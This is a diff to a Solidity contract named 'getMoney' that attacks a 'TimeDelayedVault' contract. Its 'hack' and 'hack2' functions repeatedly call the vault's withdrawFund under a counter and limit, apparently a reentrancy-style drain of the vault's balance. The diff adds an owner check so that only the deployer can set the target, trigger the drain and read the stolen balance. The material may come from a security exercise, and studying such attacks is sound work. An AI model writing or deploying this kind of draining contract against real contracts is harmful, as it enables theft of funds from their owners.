@@ -158,22 +158,30 @@ contract getMoney{
     uint public count = 0;
     uint public limit = 1;
     uint public gaslimit = 30000000;
-    
+    address public ownerLALALA;
     TimeDelayedVault ct = TimeDelayedVault(ct_addr);
-    function setGas(uint _gas){
+    
+    modifier onlyOwner() {
+        require(msg.sender == ownerLALALA);
+        _;
+    }
+    function getMoney(){
+        ownerLALALA = msg.sender;
+    }
+    function setGas(uint _gas) onlyOwner{
         gaslimit = _gas;
     }
-    function setTarget(address _addr){
+    function setTarget(address _addr) onlyOwner{
         ct_addr = _addr;
     }
-    function addObserver(){
+    function addObserver() onlyOwner{
        ct.setObserver(this);    
     }
-    function hack(){ // need checkObserver first
+    function hack() onlyOwner{ // need checkObserver first
          count += 1;
          ct.withdrawFund(this);
     }
-    function hack2(){ // need checkObserver first
+    function hack2() onlyOwner{ // need checkObserver first
          ct.setObserver(this);
          count += 1;
 
@@ -188,10 +196,10 @@ contract getMoney{
             count = 0;
         }
     }
-    function theBalance () returns (uint _balance){
+    function theBalance () onlyOwner returns (uint _balance){
         return this.balance;
     }
-    function setLimit(uint _limit) returns (uint){
+    function setLimit(uint _limit) onlyOwner returns (uint) {
         limit = _limit;
         return limit;
     }
